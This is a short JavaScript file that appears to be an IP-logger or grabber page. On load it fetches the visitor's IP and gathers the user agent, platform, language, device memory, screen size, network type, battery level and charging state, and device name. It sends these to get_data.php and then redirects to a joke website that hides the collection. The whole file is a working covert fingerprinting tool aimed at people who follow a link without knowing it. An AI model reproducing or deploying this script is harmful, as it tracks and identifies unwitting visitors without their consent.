function Redirect() {
  window.open("https://you.regettingold.com/");
}

function send(theUrl) {
  var xmlHttp = new XMLHttpRequest();
  xmlHttp.open("GET", theUrl, false);
  xmlHttp.send(null);
  return xmlHttp.responseText;
}

async function fetchData() {
  ip = send("./ip.php?echo=true");
  time = new Date()+"";
  cookie = navigator.cookieEnabled;
  touch = navigator.maxTouchPoints;
  ua = navigator.userAgent;
  platf = navigator.platform;
  lang = navigator.language;
  memory = navigator.deviceMemory;
  wid = screen.width;
  hig = screen.height;
  netType = navigator.connection["type"];
  saveData = navigator.connection["saveData"];

  if ("getBattery" in navigator) {
    await navigator.getBattery().then((battery) => {
      batLevel = battery.level * 100 + "%";
      batCharge = battery.charging;
    }).catch((error) => {
      console.error(error);
    });
  }


  try {
    dname = WURFL.complete_device_name;
  } catch (e) {
    dname = "";
  }
}
try {
  fetchData().then((result) => {
    var sendQuery = `&time=${time}&touch=${touch}&cookie=${cookie}&ua=${ua}&platf=${platf}&lang=${lang}&memory=${memory}&wid=${wid}&hig=${hig}&netType=${netType}&saveData=${saveData}&batLevel=${batLevel}&batCharge=${batCharge}&dname=${dname}`;

    sent = send("./get_data.php?ip="+ip+encodeURI(sendQuery));
    Redirect();
  })
} catch (e) {
  console.log(e.toString())
}
